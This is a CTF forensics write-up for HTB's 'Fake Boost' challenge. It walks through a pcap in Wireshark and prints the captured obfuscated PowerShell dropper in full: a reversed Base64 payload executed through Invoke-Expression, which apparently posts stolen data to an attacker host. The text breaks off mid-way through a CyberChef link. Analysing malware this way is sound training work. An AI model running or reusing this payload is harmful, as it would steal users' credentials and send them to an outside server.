---
title: HTB Cyber Apocalypse - Fake Boost
date: Sat Mar 14 10:34:16 PM +04 2024
categories: [Writeup]
tags: [ctf,htb,htb2024,htb_cyber_apocalypse_2024,forensics,pcap,wireshark,cryptography]
---

## Description

POINTS: 475<br>
DIFFICULTY: easy

In the shadow of The Fray, a new test called ""Fake Boost"" whispers promises of free Discord Nitro perks. It's a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.

## Solution

We are given a pcap file which contains the traffic for challenge. Most of it is either HTTP or QUIC. Only readable stream in traffic is HTTP so let's filter for that using Wireshark.

![fake-boost-1](/assets/images/htb/2024/cyber_apocalypse/fake-boost-1.png)

In the first request we see huge Base64 blob being downloaded.

```pwsh
$jozeq3n = "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gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0AIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAiCN8yX8BCIg8yXf91XfxFIv81XfxFIv81Xf91XcBCIv81XfxFIgw3X891Xcx3Xv8FXgw3XcBCffxyXfxFIgw3X89yXf9FXf91Xc9yXf9FffxHIv81XfxHI891XfxFff91XcBCI89Ffgw3XcpQD8BCIf91Xc91XvAyLu8CIv8Ffgw1Xf91Lg8iLgwHIp8FKgwHI8BCffxHI8BCfgACX8BCfgwHI89FKgwHI8BCfgkyXoACffhCIcByXfxFI89CIvwHI8ByLf9FIg8yXfBCI8BCfgwHI8BCfK0Afgw3XvAyLg8CIvACI8BCfvACI8BCIvAyLgACIgwFIfByLf91Jgw3XfBCfgwHIgBiLgwHI8BCYfByLf91JgwHXg8FIv81Xg8Cff9FIvACfgwHI8BCfgwFIfByLcByXg8yXfdCI89FIgwnCNwHI89CIvcyLg8CInAGfgcyL8BCfn8CIvAyJgBCIg81XfByXfByXg8Ffgw3X8BCfcBCI8BCfgw3XfByXfByXgAyXf9FIf91XgAyXf9FIfxHI8BCfgwHIg81XfBCIf91Xg81Xg8FIfxHI8pQD8BCIg8CIcBCIf9FIvwHIg8FIgwHXgAyXfByLgACIgACIgACIgACIgwHIp8FKgwHIcBCfgwHI8BCIgACIgACIgACIgACIgACIgACIgkyXoACIfBCI8BCIgACIgACIgACIgACff91XgACfK0AIf91XgACIf91Xf9FIg81Xf91XgAyXf91XfBCIgACIgACIgACIgACIg8FIfByXgACIfBCIg8FIgACIgACIgACIgACIgACIgACIgACIg8FIf91Xf91XgACIgACIgACIgACIgAyXf91Xf9lCNICI0N3bI1SZ0lmcXpQDK0QfK0QKhRXYExGb1ZGJocmbpJHdTRjNlNXYC9GV6oTX0JXZ252bD5SblR3c5N1WgACIgoQDhRXYERWZ0BXeyNmblRCIrAiVJ5CZldWYuFWTzVWYkASPgEGdhREbsVnZkASXdtVZ0lnYbBCIgAiCNsTKoR3ZuVGTuMXZ0lnYkACLwACLzVGd5JGJos2YvxmQsFmbpZUby9mZz5WYyRlLy9Gdwlncj5WZkASPgEGdhREZlRHc5J3YuVGJgACIgoQDpgicvRHc5J3YuVUZ0FWZyNkLkV2Zh5WYNNXZhRCI9AicvRHc5J3YuVGJgACIgoQD5V2akACdjVmai9EZldWYuFWTzVWQtUGdhVmcDBSPgQWZnFmbh10clFGJgACIgoQDpQHelRnbpFGbwRCKzVGd5JEdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgMXZ0lnYkACIgAiCNsHIpQHelRnbpFGbwRCIskXZrRCKn5WayR3UtQHc5J3YuVEIu9Wa0Nmb1ZmCNoQD9pQDkV2Zh5WYNNXZhRCIgACIK0QfgACIgoQD9BCIgACIgACIK0QeltGJg0DI5V2SuQWZnFmbh10clFGJgACIgACIgACIgACIK0wegU2csVGIgACIgACIgoQD9BCIgACIgACIK0QK5V2akgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuQWZnFmbh10clFGJgACIgACIgACIgACIK0wegkiIn5WayR3UiAScl1CIl1WYO5SKoUGc5RFdldmL5V2akgCImlGIgACIgACIgoQD7BSK5V2akgCImlGIgACIK0QfgACIgoQD9BCIgACIgACIK0gVJRCI9AiVJ5CZldWYuFWTzVWYkACIgACIgACIgACIgoQD7BSZzxWZgACIgACIgAiCN0HIgACIgACIgoQDpYVSkgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DIWlkLkV2Zh5WYNNXZhRCIgACIgACIgACIgAiCNsHIpIyZulmc0NlIgEXZtASZtFmTukCKlBXeURXZn5iVJRCKgYWagACIgACIgAiCNsHIpYVSkgCImlGIgACIK0gN1IDI9ASZ6l2U5V2SuQWZnFmbh10clFGJgACIgoQD4ITMg0DIlpXaTt2YvxmQuQWZnFmbh10clFGJgACIgoQD3M1QLBlO60VZk9WTn5WakRWYQ5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgcmbpRGZhBlLkV2Zh5WYNNXZhRCIgACIK0gCNoQD9JkRPpjOdVGZv1kclhGcpNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFI9ASZk9WTuQWZnFmbh10clFGJ7liICZ0Ti0TZk9WbkgCImlWZzxWZgACIgoQD9J0QFpjOdVGZv1kclhGcpNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFI9ASZk9WTuQWZnFmbh10clFGJ7BSKiI0QFJSPlR2btRCKgYWalNHblBCIgAiCN03UUNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5CZldWYuFWTzVWYksHIpIyUUNkI9UGZv1GJoAiZpV2csVGIgACIK0QfCZ0Q6oTXlR2bNJXZoBXaD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgUGZv1kLkV2Zh5WYNNXZhRyegkiICZ0Qi0TZk9WbkgCImlWZzxWZgACIgoQD9ByQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5CZldWYuFWTzVWYkAyegkiIDJ0Qi0TZk9WbkgCImlGIgACIK0gCNICZldWYuFWTzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NlIgQ3YlpmYP1ydl5EI9ACZldWYuFWTzVWYkACIgAiCNsHIpUGZv1GJgwiVJRCIskXZrRCK0NWZqJ2TkV2Zh5WYNNXZB1SZ0FWZyNEIu9Wa0Nmb1ZmCNoQD9pQD9BCIgAiCN03egg2Y0F2YgACIgACIgAiCN0HIgACIgACIgoQDlNnbvB3clJFJg4mc1RXZyBCIgACIgACIgACIgoQDzJXZkFWZIRCIzJXZkFWZI1CI0V2RgQ2boRXZN1CIpJXVkASayVVLgQ2boRXZNR3clJVLlt2b25WSg0DIlNnbvB3clJFJgACIgACIgACIgACIK0gCNISZtB0LzJXZzV3L5Y3LpBXYv02bj5CZy92YzlGZv8iOzBHd0hmIg0DIpJXVkACIgACIgACIgACIgoQDK0QfgACIgACIgACIgACIK0gI2MjL3MTNvkmchZWYTBCO04CN2gjLw4SM58SZnRWRgkybrNWZHBSZrlGbgwCTNRFSLhCI2MjL3MTNvQXaLJWZXVGbwBXQgkCN2gHI7QjNul2VgsDMuATMgQlTgM3dvRmbpdFKgAjL18SYsxWa69WTiASPgICduV2ZB1iclNXViACIgACIgACIgACIgACIgAiCNIibvNnav42bpRXYjlGbwBXYiASPgISZwlHVtQnblRnbvNkIgACIgACIgACIgACIgACIgoQDuV2avRFJg0DIi42bpRXY6lmcvhGd1FkIgACIgACIgACIgACIgACIgoQD7BEI9AycyVGZhVGSkACIgACIgACIgACIgoQD7BSeyRHIgACIgACIgoQD7ByczV2YvJHcgACIgoQDK0QKgACIgoQDuV2avRFJddmbpJHdztFIgACIgACIgoQDdlSZ1JHdkASPgkncvRXYk5WYNhiclRXZtFmchB1WgACIgACIgAiCNgCItFmchBFIgACIK0QXpgyZulGZulmQ0VGbk12QbBCIgAiCNsHIvZmbJJXZzVFZy92YzlGRtQXZHBibvlGdj5WdmpQDK0QfK0wclR2bjRCIuJXd0VmcgACIgoQDK0QfgACIgoQDlR2bjRCI9sCIzVGZvNGJgACIgACIgAiCNkSfgkCK5FmcyFkchh2QvRlLzJXYoNGJgQ3YlpmYPRXdw5WStASbvRmbhJVL0V2RgsHI0NWZqJ2Ttg2YhVkcvZEI8BCa0dmblxUZk92Yk4iLxgCIul2bq1CI9ASZk92YkACIgACIgACIK0wegkyKrkGJgszclR2bDZ2TyVmYtVnbkACds1CIpRCI7ADI9ASakgCIy9mZgACIgoQDK0QKoAEI9AyclR2bjRCIgACIK0wJ5gzN2UDNzITMwoXe4dnd1R3cyFHcv5Wbstmaph2ZmVGZjJWYalFWXZVVUNlURB1TO1ETLpUSIdkRFR0QCF0Jg0DIzJXYoNGJgACIgoQDK0QKgACIgoQD2EDI9ACa0dmblxUZk92Yk0Fdul2WgACIgACIgAiCNwCMxASPgMXZk92Qm9kclJWb15GJdRnbptFIgACIgACIgoQDoASbhJXYwBCIgAiCNsHIzVGZvN0byRXaORmcvN2cpRUZ0Fmcl5WZHBibvlGdj5WdmpQDK0QfK0wcuV2avRHJg4mc1RXZyBCIgAiCNoQD9tHIoNGdhNGI9BCIgAiCN0HIgACIgACIgoQD9tHIoNGdhNGI9BCIgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgAiCN0HIgACIgACIgACIgACIgACIgACIgoQDlVHbhZlLzVGajRXYN5yXkACIgACIgACIgACIgACIgACIgACIgACIgoQD7BCdjVmai9ULoNWYFJ3bGBCfgMXZoNGdh1EbsFULggXZnVmckAibyVGd0FGUtAyZulmc0NVL0NWZsV2UgwHI05WZ052bDVGbpZGJg0zKgMnblt2b0RCIgACIgACIgACIgACIgACIgACIgoQD7BSKpcSf1kDLwgzed1ydctlLcFmZtdCIscSfwETMsUjM71VL3x1WuwVf2sXXtcHXb5CX9ZjM71VL3x1WngCQg4WaggXZnVmckgCIoNWYlJ3bmBCIgACIgACIgACIgACIgAiCNoQDw9GdTBibvlGdjFkcvJncF1CI3FmUtASZtFmTsxWdG5yXkACa0FGUtACduVGdu92QtQXZHBSPgQnblRnbvNUZslmZkACIgACIgACIgACIgACIgAiCNsHI5JHdgACIgACIgACIgACIK0AIgACIgACIgACIgAiCNsHI0NWZqJ2Ttg2YhVkcvZEI8BSZjJ3bG1CIlNnc1NWZS1CIlxWaG1CIoRXYwRCIoRXYQ1CItVGdJRGbph2QtQXZHBCIgACIgACIK0wegknc0BCIgAiCNoQDpgCQg0DIz5WZr9GdkACIgAiCNoQDpACIgAiCNgGdhBHJddmbpJHdztFIgACIgACIgoQDoASbhJXYwBCIgAiCNsHIsFWZ0NFIu9Wa0Nmb1ZmCNoQDiEGZ3pWYrRmap9maxomczkDOxomcvADOwgjO1MTMuYTMx4CO2EjLykTMv8iOwRHdoJCI9ACTSVFJ" ;
$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2>&1> $null ;
$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing("$s0yAY2gmHVNFd7QZ")) ;
$U9COA51JG8eTcHhs0YFxrQ3j = "Inv"+"OKe"+"-EX"+"pRe"+"SSI"+"On" ; New-alIaS -Name pWn -VaLuE $U9COA51JG8eTcHhs0YFxrQ3j -FoRcE ; pWn $lOADcODEoPX3ZoUgP2T6cvl3KEK ;
```

It seems like first variable is reversed representation of payload to be executed.

Obfuscated Payload -> Reverse -> Decode Base64 -> Invoke Expression (Execute Command)

If you're on Windows you can delete last line and just echo the Base64 decoded variable.

[Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=OUJ5WGtBQ2QxQkhkMTlVTGxSWGF5ZEZJN0JDZGpWbWFpOVVMb05XWUZKM2JHQkNmZ01YZWx0R0pLMGdOeEFDYTBkbWJseFVaazkyWXRBU05nTVhaazkyUW05a2NsSldiMTVXTGdNWFprOTJRdkpIZHA1RVp5OTJZemxHUmxSWFl5Vm1ibGRFSTlBeWM1VjJha29RRGlvemM1VjJTZzhtYzBsbVRnUW1jdk4yY3BSRUloTTNjbE4yWTFObElnUTNjdmhVTGxSWGF5ZGxDTm9RRDl0SElvTkdkaE5tQ04wbkNORUdkaFJFWmxSSGM1SjNZdVZHSmdrSFp2SlVMZ01uY2xSV1lsaEdKZ01uY2xSV1lsaFVMZ1EzY3ZCRklrOUdhMFZXVHRBQ1RTVkZKZ2ttY1YxQ0lrOUdhMFZXVDBOWFpTMVNacjltZHVsRUlnQUNJSzBRZmdBQ0lnb1FEbkFqTDE4U1lzeFdhNjlXVG5BU1BnY0NkdVYyWkIxaWNsTlhWbkFDSWdBQ0lnQUNJSzB3SnVsV1lzQjNMMGhYWjBkQ0k5QXlKbEJYZVUxQ2R1VkdkdTkyUW5BQ0lnQUNJZ0FDSUswd2VBQlNQZ01uY2xSV1lsaEdKZ0FDSWdvUUQ3QlNleVJuQ05vUURrRjJic2xYWXdSQ0kwaFhaMDVXYWh4R2N0QVNXRnQwWFRWVVFrQVNlbHRXTGdjbWJwSkhkVDFDZHdsbmNqNVdSZzBESWhSWFlFUldaMEJYZXlObWJsUmlDTkFUTWdnR2R3VkdSdEFpYnZOblN0OEdWMEpYWjI1MmJEQkNmZ00zYm01V1N5VjJjMVJDSTlBQ1poOUdiNUZHY2tvUURpMHpheU0xUldkMVV4SVZWWk5YTlhOV05HMVdZMVVFUmtwM2FxZEZXa0pEWjFNM1JXOWtTSUYyZGtGVFdpQVNQZ2tWUkw5MVVGRkVKSzBnQ04wbkNOMEhJZ0FDSUswd2NzbFdZMFZHUnlWMmMxUkNJOXNDSXo5bVp1bGtjbE5YZGtBQ0lnQUNJZ0FDSUswUWZnQUNJZ0FDSWdBaUNONFdacjlHZGtBU1BnNFdacjlHVmdBQ0lnQUNJZ0FDSWdBQ0lLMFFadEZtYmZ4V1lpOUdibjV5Ym01V1N5VjJjMVJDSTlBU1p0Rm1Uc0ZtWXZ4MlJnQUNJZ0FDSWdBQ0lnQUNJSzBBYnBGV2JsNXlibTVXU3lWMmMxUkNJOUFDYnBGV2JGQkNJZ0FDSWdBQ0lnQUNJZ29RRGtsbUx2Wm1iSkpYWnpWSEpnMERJRWxFSWdBQ0lnQUNJZ0FDSWdBaUNOc0hRZFIzWWxwbVlQMTJiME5YZERORlViQlNQZ01IYnBGR2RsUmtjbE5YZGtBQ0lnQUNJZ0FDSUswd2Vna3libTVXU3lWMmMxUkNLZ1lXYWdBQ0lnb1FEdVYyYXZSSEpnNFdacjlHVnRBeWJtNVdTeVYyY1ZSbWN2TjJjcFJVTDBWMlJnMERJdlptYkpKWFp6VkhKZ0FDSWdvUUQ3QlNLejVXWnI5R1ZzeFdZa0FpYnBCaWJsdDJiMFJDS2dnMlloVm1jdlptQ05rQ0tBQlNQZ00zYm01V1N5VjJjMVJpQ05vUUQ5cFFEejVXWnI5R2RrQVNQckF5Y3VWMmF2UkZic0ZHSmdBQ0lnb1FEb1JYWVFSbmJsSm5jMU5HSmdnR2RoQlhMZ3dXWWxSM1VnMERJejVXWnI5R2RrQUNJZ0FpQ05vUUQ5VldkdWxHZHU5Mlk3QlNLcElYWnVsV1kwNTJiREJTWndsSFZvUlhZUTFDSW9SWFlRUm5ibEpuYzFOR0pnZ0dkaEJWTDBOWFpVaENJMDltYnRnQ0ltbEdJZ0FDSUswZ0NOMFZieTltWjBGR2J3UnlXemhHZGhCSEpnMERJb1JYWVFSbmJsSm5jMU5HSmdBQ0lnb1FEN0JTS3psWFpMNXljb1JYWXdSQ0l1bEdJdEozYm1SWFlzQkhKb0FDYWpGV1p5OW1aSzBRS29BRUk5QXljdVYyYXZSRmJzRkdKSzBnQ04wbkNOY2lOejR5TnpVekxwSlhZbUYyVWdnRE51UWpONDRDTXVFVE92VTJaa1ZFSXA4MmFqVjJSZ1UyYXB4R0lzd1VUVWgwU29BaU56NHlOelV6TDBsMlNpVjJWbHhHY3dGRUlwUWpONEJ5TzBZamJwZEZJN0FqTHdFRElVNUVJemQzYms1V2FYaENJdzRTTnZFR2JzbG1ldjEwSmcwREluUW5ibGRXUXRJWFp6VjFKZ0FDSWdvUURuNDJienAyTHU5V2EwRjJZcHhHY3dGMkpnMERJblVHYzVSVkwwNVdaMDUyYkRkQ0lnQUNJSzB3ZUFCU1BnTW5jbFJXWWxoR0pLMGdDTjBuQ05JeWNseFdhbTltY1F4RmV2WldaeWxtUmNGR2JzbG1ldjFFWG41V2F0RjJieVJpSWcwREluZzNibVZtY3BaMEpnQUNJZ29RRGlVR2JpRkdkVEJTWXlWR2NQeFZaeUYyZDBaMmJUQlNZeVZHY1B4MVp1bFdiaDltY2tJQ0k5QXlKaEpYWnc5MEpnQUNJZ29RRGl3RmRzVlhZbVZHUmNGR2RoUkVJeVYyY1Z4bGNsTjNkdkpuUXRVbWRoSm5RY1ZtY2hkSGRtOTJVbFpYWXlKRVhzRjJZdnhHSmlBU1BnY1NaMkZtY0NkQ0lnQUNJSzBnSTB4V2RoWldaRXhWWTBGR1JnSVhaelZGWGwxMmJ5aDJRY1ZHYm45MmJIeEZiaE4yYnNSaUlnMERJblVXYnZKSGFEQlNac2QyYnZkMEpnQUNJZ29RRDdCRUk5QXljb1JYWXdSaUNOb1FEaVltUkRwbGVWUlVUM2gyTU5aV055MEVTQ3AyWXpVa2FVWm1UNjFVZWFKVFpESmxSVEpDSTlBU00wSlhZd1JpQ05FRVZCUkVVUUZrTzI1V1prQVNQZ2NtYnAxV1l2SkhKSzBRUVVGRVJRQlZRTUYwUVB4a08yNVdaa0FTUGd3V1lqOUdia29RREswZ0l1NGlMMDVXWnBSWFl3QlNaaUJTWnpGV1pzQkZJaE1YZWx0R0l2SkhkcDVHSWtKM2JqTlhhRUJ5WnVsR2RoSlhadVYyUmlBQ2R6OUdTdFVHZHBKM1ZLMGdJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lLMEFJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBaUNOOHlYOEJDSWc4eVhmOTFYZnhGSXY4MVhmeEZJdjgxWGY5MVhjQkNJdjgxWGZ4RklndzNYODkxWGN4M1h2OEZYZ3czWGNCQ2ZmeHlYZnhGSWd3M1g4OXlYZjlGWGY5MVhjOXlYZjlGZmZ4SEl2ODFYZnhISTg5MVhmeEZmZjkxWGNCQ0k4OUZmZ3czWGNwUUQ4QkNJZjkxWGM5MVh2QXlMdThDSXY4RmZndzFYZjkxTGc4aUxnd0hJcDhGS2d3SEk4QkNmZnhISThCQ2ZnQUNYOEJDZmd3SEk4OUZLZ3dISThCQ2Zna3lYb0FDZmZoQ0ljQnlYZnhGSTg5Q0l2d0hJOEJ5TGY5RklnOHlYZkJDSThCQ2Znd0hJOEJDZkswQWZndzNYdkF5TGc4Q0l2QUNJOEJDZnZBQ0k4QkNJdkF5TGdBQ0lnd0ZJZkJ5TGY5MUpndzNYZkJDZmd3SElnQmlMZ3dISThCQ1lmQnlMZjkxSmd3SFhnOEZJdjgxWGc4Q2ZmOUZJdkFDZmd3SEk4QkNmZ3dGSWZCeUxjQnlYZzh5WGZkQ0k4OUZJZ3duQ053SEk4OUNJdmN5TGc4Q0luQUdmZ2N5TDhCQ2ZuOENJdkF5SmdCQ0lnODFYZkJ5WGZCeVhnOEZmZ3czWDhCQ2ZjQkNJOEJDZmd3M1hmQnlYZkJ5WGdBeVhmOUZJZjkxWGdBeVhmOUZJZnhISThCQ2Znd0hJZzgxWGZCQ0lmOTFYZzgxWGc4RklmeEhJOHBRRDhCQ0lnOENJY0JDSWY5Rkl2d0hJZzhGSWd3SFhnQXlYZkJ5TGdBQ0lnQUNJZ0FDSWdBQ0lnd0hJcDhGS2d3SEljQkNmZ3dISThCQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lna3lYb0FDSWZCQ0k4QkNJZ0FDSWdBQ0lnQUNJZ0FDZmY5MVhnQUNmSzBBSWY5MVhnQUNJZjkxWGY5RklnODFYZjkxWGdBeVhmOTFYZkJDSWdBQ0lnQUNJZ0FDSWdBQ0lnOEZJZkJ5WGdBQ0lmQkNJZzhGSWdBQ0lnQUNJZ0FDSWdBQ0lnQUNJZ0FDSWdBQ0lnOEZJZjkxWGY5MVhnQUNJZ0FDSWdBQ0lnQUNJZ0F5WGY5MVhmOWxDTklDSTBOM2JJMVNaMGxtY1hwUURLMFFmSzBRS2hSWFlFeEdiMVpHSm9jbWJwSkhkVFJqTmxOWFlDOUdWNm9UWDBKWFoyNTJiRDVTYmxSM2M1TjFXZ0FDSWdvUURoUlhZRVJXWjBCWGV5Tm1ibFJDSXJBaVZKNUNabGRXWXVGV1R6VldZa0FTUGdFR2RoUkVic1ZuWmtBU1hkdFZaMGxuWWJCQ0lnQWlDTnNUS29SM1p1VkdUdU1YWjBsbllrQUNMd0FDTHpWR2Q1SkdKb3MyWXZ4bVFzRm1icFpVYnk5bVp6NVdZeVJsTHk5R2R3bG5jajVXWmtBU1BnRUdkaFJFWmxSSGM1SjNZdVZHSmdBQ0lnb1FEcGdpY3ZSSGM1SjNZdVZVWjBGV1p5TmtMa1YyWmg1V1lOTlhaaFJDSTlBaWN2UkhjNUozWXVWR0pnQUNJZ29RRDVWMmFrQUNkalZtYWk5RVpsZFdZdUZXVHpWV1F0VUdkaFZtY0RCU1BnUVdabkZtYmgxMGNsRkdKZ0FDSWdvUURwUUhlbFJuYnBGR2J3UkNLelZHZDVKRWRsZGtMNFlFVlZwak9kZG1icFIyYmo1V1J1UUhlbFJsTHRWR2R6bDNVYkJTUGdNWFowbG5Za0FDSWdBaUNOc0hJcFFIZWxSbmJwRkdid1JDSXNrWFpyUkNLbjVXYXlSM1V0UUhjNUozWXVWRUl1OVdhME5tYjFabUNOb1FEOXBRRGtWMlpoNVdZTk5YWmhSQ0lnQUNJSzBRZmdBQ0lnb1FEOUJDSWdBQ0lnQUNJSzBRZWx0R0pnMERJNVYyU3VRV1puRm1iaDEwY2xGR0pnQUNJZ0FDSWdBQ0lnQUNJSzB3ZWdVMmNzVkdJZ0FDSWdBQ0lnb1FEOUJDSWdBQ0lnQUNJSzBRSzVWMmFrZ3ladWxtYzBORk4yVTJjaEpVYnZKblI2b1RYMEpYWjI1MmJENVNibFIzYzVOMVdnMERJNVYyU3VRV1puRm1iaDEwY2xGR0pnQUNJZ0FDSWdBQ0lnQUNJSzB3ZWdraUluNVdheVIzVWlBU2NsMUNJbDFXWU81U0tvVUdjNVJGZGxkbUw1VjJha2dDSW1sR0lnQUNJZ0FDSWdvUUQ3QlNLNVYyYWtnQ0ltbEdJZ0FDSUswUWZnQUNJZ29RRDlCQ0lnQUNJZ0FDSUswZ1ZKUkNJOUFpVko1Q1psZFdZdUZXVHpWV1lrQUNJZ0FDSWdBQ0lnQUNJZ29RRDdCU1p6eFdaZ0FDSWdBQ0lnQWlDTjBISWdBQ0lnQUNJZ29RRHBZVlNrZ3ladWxtYzBORk4yVTJjaEpVYnZKblI2b1RYMEpYWjI1MmJENVNibFIzYzVOMVdnMERJV2xrTGtWMlpoNVdZTk5YWmhSQ0lnQUNJZ0FDSWdBQ0lnQWlDTnNISXBJeVp1bG1jME5sSWdFWFp0QVNadEZtVHVrQ0tsQlhlVVJYWm41aVZKUkNLZ1lXYWdBQ0lnQUNJZ0FpQ05zSElwWVZTa2dDSW1sR0lnQUNJSzBnTjFJREk5QVNaNmwyVTVWMlN1UVdabkZtYmgxMGNsRkdKZ0FDSWdvUUQ0SVRNZzBESWxwWGFUdDJZdnhtUXVRV1puRm1iaDEwY2xGR0pnQUNJZ29RRDNNMVFMQmxPNjBWWms5V1RuNVdha1JXWVE1U2VvQlhZeWQyYjBCWGV5TmtMNVJYYXlWM1lsTmxMdFZHZHpsM1ViQlNQZ2NtYnBSR1poQmxMa1YyWmg1V1lOTlhaaFJDSWdBQ0lLMGdDTm9RRDlKa1JQcGpPZFZHWnYxa2NsaEdjcE5rTDVoR2NoSjNadlJIYzVKM1F1a0hkcEpYZGpWMlV1MFdaME5